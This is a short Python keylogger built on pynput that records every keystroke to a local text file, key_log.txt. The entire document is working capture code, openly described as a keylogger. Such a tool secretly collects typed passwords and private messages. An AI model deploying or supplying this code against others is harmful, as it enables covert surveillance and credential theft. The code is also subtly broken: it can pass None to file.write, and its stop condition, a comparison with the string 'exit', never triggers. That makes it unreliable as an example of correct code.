from pynput.keyboard import Listener

# File to store the logged keystrokes
log_file = "key_log.txt"

# Function to write keystrokes to the file
def on_press(key):
    with open(log_file, "a") as file:
        # Format special keys like 'Key.space' and 'Key.enter'
        if hasattr(key, 'char'):
            file.write(key.char)
        else:
            file.write(f'[{key}]')

# Function to stop the keylogger (optional if testing in a controlled environment)
def on_release(key):
    if key == 'exit':  # Placeholder for a stop condition
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
